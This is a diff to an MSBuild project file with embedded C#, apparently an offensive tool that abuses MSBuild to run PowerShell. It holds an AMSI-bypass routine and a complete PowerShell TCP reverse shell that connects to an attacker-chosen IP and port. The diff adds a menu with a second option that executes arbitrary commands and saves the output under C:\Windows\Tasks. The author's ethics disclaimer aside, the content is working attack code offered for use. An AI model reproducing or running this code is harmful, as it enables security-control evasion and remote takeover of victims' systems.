@@ -1,28 +1,28 @@
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-	<Target Name="Bypass">
-		<FullBypass />
-	</Target>
-	<UsingTask
-		TaskName="FullBypass"
-		TaskFactory="CodeTaskFactory"
-		AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
-		<Task>
-			<Reference Include="System.Management.Automation" />
-			<Code Type="Class" Language="cs">
-			<![CDATA[
-				using System;
-				using System.Runtime.InteropServices;
-				using System.Diagnostics;
-				using System.IO;
-				using Microsoft.Build.Framework;
+    <Target Name="Bypass">
+        <FullBypass />
+    </Target>
+    <UsingTask
+        TaskName="FullBypass"
+        TaskFactory="CodeTaskFactory"
+        AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+        <Task>
+            <Reference Include="System.Management.Automation" />
+            <Code Type="Class" Language="cs">
+                <![CDATA[
+                using System;
+                using System.Runtime.InteropServices;
+                using System.Diagnostics;
+                using System.IO;
+                using Microsoft.Build.Framework;
                 using Microsoft.Build.Utilities;
-				using System.ComponentModel;
-			    using System.Collections.Generic;
-			    using System.Collections.ObjectModel;
-				using System.Management.Automation;
-			    using System.Management.Automation.Runspaces;
-				
-				public class FullBypass : Task, ITask
+                using System.ComponentModel;
+                using System.Collections.Generic;
+                using System.Collections.ObjectModel;
+                using System.Management.Automation;
+                using System.Management.Automation.Runspaces;
+
+                public class FullBypass : Task, ITask
                 {
 
                     [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
@@ -40,9 +40,9 @@
 
                     public static int BypassAMSI()
                     {
-			Console.WriteLine("Author: Shelldon");
-			Console.WriteLine("github: github.com/Sh3lldon");
-			Console.WriteLine("!!!! Please do not use in unethical hacking and follow all rules and regulations of laws!!!!");
+            Console.WriteLine("Author: Shelldon");
+            Console.WriteLine("github: github.com/Sh3lldon");
+            Console.WriteLine("!!!! Please do not use in unethical hacking and follow all rules and regulations of laws!!!!");
 
                         Process[] processes = Process.GetProcessesByName("powershell");
                         if (processes.Length != 0)
@@ -163,47 +163,64 @@
 
                         PowerShell ps = PowerShell.Create();
                         Console.WriteLine(BypassAMSI());
-						
-						Console.Write("[*] Attacker IP: ");
-                        string ip = Console.ReadLine();
 
-                        Console.Write("[*] Attacker port: ");
-                        string port = Console.ReadLine();
-						
-						//Change IP and PORT
-						string revShellcommand = @"$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);
-                                    $stream = $client.GetStream();
-                                    [byte[]]$bytes = 0..65535|%{0};
-                                    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
-                                    {
-	                                    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-	                                    try
-	                                    {	
-		                                    $sendback = (iex $data 2>&1 | Out-String );
-		                                    $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
-	                                    }
-	                                    catch
-	                                    {
-		                                    $error[0].ToString() + $error[0].InvocationInfo.PositionMessage;
-		                                    $sendback2  =  ""ERROR: "" + $error[0].ToString() + ""`n`n"" + ""PS "" + (pwd).Path + '> ';
-	                                    }	
-	                                    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-	                                    $stream.Write($sendbyte,0,$sendbyte.Length);
-	                                    $stream.Flush();
-                                    };
-                                    $client.Close();";
-    
-                        revShellcommand = revShellcommand.Replace("IP", ip).Replace("PORT", port);
-			
-                        ps.AddScript(revShellcommand);
-						ps.Invoke();
-						
+                        Console.WriteLine("Choose Option Below : ");
+                        Console.WriteLine("[1] Trigger Reverse-Shell");
+                        Console.WriteLine("[2] Execute Command");
+                        string option = Console.ReadLine();
+
+                        // going to make it fetch between two options for simplicity of options
+                        if (option == "1") {
+                            Console.Write("[*] Attacker IP: ");
+                            string ip = Console.ReadLine();
+
+                            Console.Write("[*] Attacker port: ");
+                            string port = Console.ReadLine();
+
+                            //Change IP and PORT
+                            string revShellcommand = @"$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);
+                                        $stream = $client.GetStream();
+                                        [byte[]]$bytes = 0..65535|%{0};
+                                        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+                                        {
+                                            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+                                            try
+                                            {
+                                                $sendback = (iex $data 2>&1 | Out-String );
+                                                $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
+                                            }
+                                            catch
+                                            {
+                                                $error[0].ToString() + $error[0].InvocationInfo.PositionMessage;
+                                                $sendback2  =  ""ERROR: "" + $error[0].ToString() + ""`n`n"" + ""PS "" + (pwd).Path + '> ';
+                                            }
+                                            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+                                            $stream.Write($sendbyte,0,$sendbyte.Length);
+                                            $stream.Flush();
+                                        };
+                                        $client.Close();";
+
+                            revShellcommand = revShellcommand.Replace("IP", ip).Replace("PORT", port);
+
+                            ps.AddScript(revShellcommand);
+                            ps.Invoke();
+                        } else if (option == "2") {
+                            Console.WriteLine("Enter Command To Execute : ")
+                            string cmd_input = Console.ReadLine();
+                            string cmd = cmd_input + " | Out-File C:\\Windows\\Tasks\\exec.txt";
+                            ps.AddScript(cmd);
+                            ps.Invoke();
+                            Console.Write("Output Saved To C:\Windows\Tasks\exec.txt");
+                        } else {
+                            Console.Write("Invalid Option!");
+                        }
+
                         rs.Close();
-						return true;
-                    } 
+                        return true;
+                    }
                 }
-			]]>
-			</Code>
-		</Task>
-	</UsingTask>
+            ]]>
+            </Code>
+        </Task>
+    </UsingTask>
 </Project>
